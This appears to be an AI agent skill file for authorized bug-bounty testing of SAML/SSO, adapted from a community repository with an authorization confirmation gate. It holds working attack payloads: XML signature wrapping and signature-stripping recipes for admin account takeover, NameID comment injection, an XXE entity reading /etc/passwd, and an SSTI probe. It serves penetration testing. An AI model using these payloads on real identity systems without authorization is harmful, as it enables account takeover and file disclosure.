---
name: hunt-saml
description: Hunt SAML / SSO attacks.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: cve_database, oasis_saml_spec, academic_research, public_research
report_count: 6
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## 20. SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.com" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml <!-- security-allowlist: documented payload decoding technique reference, do not execute outside authorized scope -->
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.com
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

---

## Related Skills & Chains

- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
